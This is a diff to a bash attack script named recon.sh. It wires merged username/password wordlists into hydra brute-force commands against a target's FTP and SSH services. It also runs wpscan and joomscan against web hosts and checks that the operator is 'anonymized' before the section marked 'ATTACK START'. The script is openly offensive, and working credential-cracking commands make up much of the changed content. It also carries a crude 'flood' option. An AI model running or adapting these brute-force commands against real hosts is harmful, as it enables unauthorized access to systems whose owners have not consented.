@@ -5,6 +5,8 @@ FTP_WORDLIST='$currentdir/wordlists/ftp-default-userpass.txt'
 SSH_WORDLIST='$currentdir/wordlists/ssh-default-userpass.txt'
 USER_FILE='${currentdir}/wordlists/simple-users.txt'
 PASS_FILE='${currentdir}/wordlists/password.lst'
+MERGED_USERPASS='${currentdir}/wordlists/merged-userpass.txt'
+MASTER_PASS='${currentdir}/wordlists/master_pass.list'
 getip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
 #How many threads to use for bruteforce ##
 THREADS='1'
@@ -28,14 +30,15 @@ flood='some commands and locations on how you want to flood the user'
 #rainbowtbl="/somedir/someplace/somefile"
 #wordlist="/somedir/someplace/somefile"
 
+RED='\033[91m'
 
-COLOR1='\033[91m'
 
 ### END VARIABLES ###
+# Enable the script to be proxied
 
 
 if [ -z $TARGET ]; then
-	        echo -e "$COLOR1 --=[Usage: recon.sh <target> "
+	        echo -e "$RED--=[Usage: recon.sh <target> "
   exit
 fi
 
@@ -52,11 +55,11 @@ read -r -p "Are you anonymized? [y/N] " response     # If you chose yes show you
 case "$response" in
     [yY][eE][sS]|[yY]) 
         echo " ${getip} is your ip"
-        ;;
+    ;;
     *)  #If not secure,  exit script #
 	echo "Ending script untill network/computer is secured"
        exit 0
-        ;;
+    ;;
 esac
 
 #### ATTACK START ####
@@ -72,18 +75,15 @@ read -r -p " Choose a port to attack " portresponse
 	# FTP ATTACK #
 
 	    21)
-	echo "Time for an ftp attack.  Cracking against ip"
-        	hydra -C $FTP_WORDLIST $ip ftp -t $THREADS -e ns
-	echo " #### Cracking against hostname #### "
-	read -r -p " Enter hostname without http/s://  " web
-                hydra -C $FTP_WORDLIST $web ftp -t $THREADS -e ns
+	echo "Time for an ftp attack.  Cracking against $TARGET"
+        	hydra -C $MERGED_USERPASS $TARGET ftp -t $THREADS -e ns
 ;;
 	# SSH ATTACK #
 
        	    22)  # If you type 22 Do this attack else do another attack 
    	echo "Time for an ssh bruteforce"
-	        hydra -C $SSH_WORDLIST $TARGET ssh -t $THREADS -e ns
-		hydra -L $USER_FILE -P $PASS_FILE $TARGET ssh -t $THREADS -e ns
+	        hydra -C $MERGED_USERPASS $TARGET ssh -t $THREADS -e ns
+		hydra -L $MERGED_USERPASS -P $MASTER_PASS $TARGET ssh -t $THREADS -e ns
 ;;
          flood)
 	echo " Flood the bitch " 
@@ -102,10 +102,10 @@ read -r -p " Choose a port to attack " portresponse
 		  case $response in 
 	wps|wordpress)
 		wpscan --url $web > $currentdir/logs/wpscan.log
-	;;
-	joom|joomla)
+		    ;;
+	  joom|joomla)
 		joomscan -u $web > $currentdir/logs/joomscan.log
-	;;
+	   	    ;;
 		esac
 ;;	
 	# SMTP ATTACK # 
@@ -114,6 +114,7 @@ read -r -p " Choose a port to attack " portresponse
 ;;
 	*)
 		echo " Either no attack for selected port, or something went wrong "
+
 ;;
 esac
 
